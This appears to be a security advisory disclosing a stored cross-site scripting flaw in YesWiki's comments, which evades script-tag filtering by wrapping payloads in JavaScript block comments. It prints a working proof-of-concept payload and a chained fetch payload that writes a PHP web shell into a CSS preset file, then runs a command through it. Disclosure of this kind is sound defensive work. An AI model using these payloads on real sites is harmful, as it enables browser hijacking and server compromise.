summary: "YesWiki Stored XSS Vulnerability in Comments\n### Summary\n\nA stored cross-site scripting\
  \ (XSS) vulnerability was discovered in the application’s comments feature. This issue allows\
  \ a malicious actor to inject JavaScript payloads that are stored and later executed in the\
  \ browser of any user viewing the affected comment.\n\nThe XSS occurs because the application\
  \ fails to properly sanitize or encode user input submitted to the comments. Notably, the\
  \ application sanitizes or does not allow execution of `<script>` tags, but does not account\
  \ for payloads obfuscated using JavaScript block comments like `/* JavaScriptPayload */`.\
  \ \n\n### PoC\nNavigate to a site and page that allows comments and place this in the comments\
  \ section and submit it: \n\n`/*<script>alert('pizzapower')</script>*/`\n\nUpon submitting\
  \ to the page, it will run. And then upon every page visit, it will run. \n\n### Impact\n\n\
  An attacker can run arbitrary JS in the victim's browser (any user that visits the page with\
  \ the comments). This can be chained to do many malicious actions, such as to achieve RCE\
  \ when chained with another vulnerability, e.g.: \n\n```\n/*<script>fetch(\"/?api/templates/custom-presets/anhtyjik.php\"\
  ,{method:\"POST\",headers:{\"Content-Type\":\"application/x-www-form-urlencoded\"},body:\"\
  primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E&secondary-color-1=%23d8604c&secondary-color-2=%23d78958&neutral-color=%234e5056&neutral-soft-color=%2357575c&neutral-light-color=%23f2f2f2&main-text-fontsize=17px&main-text-fontfamily=%22Nunito%22%2C+sans-serif&main-title-fontfamily='Nunito'%2C+sans-serif\"\
  });</script>*/\n```\n\nThen you can visit `http://localhost:8085/custom/css-presets/anhtyjik.php?cmd=id`\
  \ and see the output of the ID command."
